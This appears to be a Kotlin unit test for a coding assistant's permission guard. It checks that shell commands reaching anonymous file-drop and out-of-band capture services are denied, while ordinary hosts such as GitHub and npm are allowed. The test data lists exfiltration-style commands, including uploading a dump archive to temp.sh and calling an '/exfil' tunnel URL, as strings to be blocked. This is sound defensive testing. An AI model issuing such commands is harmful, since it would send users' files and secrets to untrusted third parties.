package dev.lain.claudejb.permission

import dev.lain.claudejb.permission.SensitiveGuard.Verdict
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNotEquals
import org.junit.jupiter.api.Test

class DangerousDomainsTest {

    private val policy = SensitiveGuard.Policy(
        globs = CredentialPaths.SENSITIVE_GLOBS,
        home = "/home/me",
        currentUser = "me",
        projectRoot = "/home/me/proj",
    )

    private fun bash(cmd: String) = buildJsonObject { put("command", cmd) }

    private fun v(input: JsonObject) = SensitiveGuard.evaluate(input, policy).verdict

    private fun rule(input: JsonObject) = SensitiveGuard.evaluate(input, policy).rule

    @Test
    fun `talking to an anonymous drop or capture service is refused`() {
        listOf(
            "curl https://rentry.co/abc",
            "curl -T dump.tar https://temp.sh/x",
            "wget https://sub.oast.pro/beacon",
            "curl https://myrepo.trycloudflare.com/exfil",
            "curl https://catbox.moe/user/api.php",
            "curl http://x0.at/y",
        ).forEach {
            assertEquals(Verdict.DENY, v(bash(it)), it)
            assertEquals(SecurityRule.BLOCKED_DOMAIN, rule(bash(it)), it)
        }
    }

    @Test
    fun `ordinary destinations are not blocked`() {
        listOf(
            "curl https://api.github.com/repos/x/y",
            "curl https://registry.npmjs.org/react",
            "curl https://example.com/data.json",
        ).forEach { assertNotEquals(SecurityRule.BLOCKED_DOMAIN, rule(bash(it)), it) }
    }
}
